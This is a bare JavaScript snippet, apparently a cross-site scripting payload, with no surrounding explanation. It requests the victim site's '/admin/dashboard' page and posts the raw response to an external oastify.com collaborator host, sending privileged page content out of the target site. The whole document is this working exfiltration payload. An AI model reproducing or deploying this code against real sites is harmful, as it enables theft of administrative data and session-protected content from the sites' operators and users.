fetch('/admin/dashboard')
  .then(r => r.text())
  .then(d => {
    fetch('https://nwnxtlyl0wtbphmg9f543jm9r0xrllq9f.oastify.com/', {
      method: 'POST',
      mode: 'no-cors',
      body: d // Raw data, no encoding needed
    });
  });
